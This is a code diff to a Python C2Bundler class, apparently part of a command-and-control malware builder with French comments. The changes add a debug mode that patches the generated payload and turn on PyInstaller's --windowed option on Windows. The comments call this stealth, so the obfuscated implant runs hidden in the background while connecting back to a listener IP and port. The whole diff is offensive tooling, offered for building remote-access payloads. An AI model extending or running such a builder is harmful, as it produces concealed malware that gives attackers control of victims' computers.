@@ -30,7 +30,7 @@ class C2Bundler:
         self.resources_dir.mkdir(exist_ok=True)
 
     def generate_payload(
-        self, listener_ip: str, listener_port: int, obfuscation_level: int
+        self, listener_ip: str, listener_port: int, obfuscation_level: int, debug_mode: bool = False
     ) -> str:
         """Génère le payload C2 complet"""
         sys.path.insert(0, str(Path(__file__).parent))
@@ -39,9 +39,19 @@ class C2Bundler:
         print(f"[*] Generating C2 payload...")
         print(f"[*] Listener: {listener_ip}:{listener_port}")
         print(f"[*] Obfuscation Level: {obfuscation_level}")
+        if debug_mode:
+            print(f"[*] DEBUG MODE: Enabled (logs to %TEMP%/c2_debug.log)")
 
         generator = C2PayloadGenerator(listener_ip, listener_port, obfuscation_level)
         payload_code = generator.generate()
+        
+        # Enable debug mode if requested
+        if debug_mode:
+            payload_code = payload_code.replace(
+                "self.debug_mode = False",
+                "self.debug_mode = True"
+            )
+        
         print(f"[+] Payload generated ({len(payload_code)} bytes)")
         return payload_code
 
@@ -78,10 +88,11 @@ class C2Bundler:
         ]
 
         # Platform-specific options
-        # Note: --windowed supprime la console mais masque aussi les erreurs
-        # On le désactive pour debug, à réactiver en production
-        # if platform == "windows" and sys.platform.startswith("win"):
-        #     cmd.extend(["--windowed"])
+        # --windowed = pas de console (stealth) mais masque les erreurs
+        # Pour debug: désactiver --windowed et activer debug_mode dans payload
+        if platform == "windows":
+            # On ajoute --windowed sur Windows pour que ça tourne en arrière-plan
+            cmd.extend(["--windowed"])
 
         # Add resources folder if patch mode
         if add_resources and self.resources_dir.exists():
